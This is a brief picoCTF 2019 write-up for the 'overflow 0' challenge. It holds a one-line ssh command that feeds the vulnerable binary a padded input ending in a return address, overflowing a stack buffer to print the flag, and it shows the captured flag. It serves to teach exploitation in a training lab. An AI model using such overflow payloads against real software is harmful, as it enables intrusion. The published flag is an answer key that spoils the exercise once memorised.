# Description
This should be easy. Overflow the correct buffer in this [program](https://2019shell1.picoctf.com/static/c2d7ab220b4f78a4dec361bb4791d8c4/vuln) and get a flag.  
Its also found in /problems/overflow-0_6_1279241c50d050a1045301d7970f2fe3 on the shell server. [Source](https://2019shell1.picoctf.com/static/c2d7ab220b4f78a4dec361bb4791d8c4/vuln.c).


# Hints
- Find a way to trigger the flag to print  
- If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.


# Solution
```bash
▶ ssh muwa00@2019shell1.picoctf.com "cd /problems/overflow-0_6_1279241c50d050a1045301d7970f2fe3/; ./vuln `python -c "print 'A'*(0x84+4) + '\x46\x86\x04\x08'"`" 
Enter your platform password (characters will be hidden): 
picoCTF{3asY_P3a5yd4a28467}
```